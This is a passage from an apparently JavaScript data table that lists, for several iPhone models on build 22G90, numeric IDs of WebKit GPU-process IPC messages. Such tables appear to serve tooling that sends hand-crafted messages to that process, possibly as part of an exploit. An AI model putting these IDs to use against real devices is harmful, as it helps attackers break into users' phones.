      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone14,5_22G90": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone14,6_22G90": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone14,7_22G90": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone14,8_22G90": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone15,2_22G90": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone15,3_22G90": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone15,4_22G90": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone15,5_22G90": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone16,1_22G90": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone16,2_22G90": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone17,1_22G90": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone17,2_22G90": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
      RemoteGraphicsContextGL_BindBuffer: 0x412,
      RemoteGraphicsContextGL_BindTexture: 0x418,
      RemoteGraphicsContextGL_BufferData0: 0x425,
      RemoteGraphicsContextGL_BufferData1: 0x426,
      RemoteGraphicsContextGL_BufferSubData: 0x427,
      RemoteGraphicsContextGL_CompileShader: 0x433,
      RemoteGraphicsContextGL_CreateBuffer: 0x440,
      RemoteGraphicsContextGL_CreateProgram: 0x442,
      RemoteGraphicsContextGL_CreateShader: 0x447,
      RemoteGraphicsContextGL_CreateTexture: 0x448,
      RemoteGraphicsContextGL_Finish: 0x470,
      RemoteGraphicsContextGL_Flush: 0x471,
      RemoteGraphicsContextGL_GetBufferSubDataInline: 0xf0f,
      RemoteGraphicsContextGL_GetShaderSource: 0xf27,
      RemoteGraphicsContextGL_LinkProgram: 0x47b,
      RemoteGraphicsContextGL_PixelStorei: 0x483,
      RemoteGraphicsContextGL_Reshape: 0x48e,
      RemoteGraphicsContextGL_ShaderSource: 0x497,
      RemoteGraphicsContextGL_TexImage2D1: 0x4a0,
      RemoteGraphicsContextGL_UseProgram: 0x4ce,
      RemoteGraphicsContextGL_VertexAttrib4f: 0x4d6,
      RemoteGraphicsContextGLProxy_WasCreated: 0x409,
      RemoteImageBuffer_PutPixelBuffer: 0x4e7,
      RemoteImageBufferProxy_DidCreateBackend: 0x4e1,
      RemoteRenderingBackend_CacheFont: 0x5a9,
      RemoteRenderingBackend_CreateImageBuffer: 0x5ad,
      RemoteRenderingBackend_ReleaseImageBuffer: 0x5bd,
      RemoteRenderingBackend_ReleaseRenderingResource: 0x5c2,
      RemoteRenderingBackendProxy_DidInitialize: 0x5a5,
      SyncMessageReply: 0xbde,
      WebProcessProxy_GPUProcessConnectionDidBecomeUnresponsive: 0xacb,
   },
   "iPhone17,3_22G90": {
      GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
      GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
      InitializeConnection: 0xbda,
      ProcessOutOfStreamMessage: 0xbdc,
      RemoteDisplayListRecorder_DrawGlyphs: 0x3cb,
      RemoteDisplayListRecorder_FillRect: 0x3e0,
      RemoteDisplayListRecorder_SetCTM: 0x3eb,
      RemoteDisplayListRecorder_StrokeRect: 0x3ff,
      RemoteGraphicsContextGL_AttachShader: 0x40d,
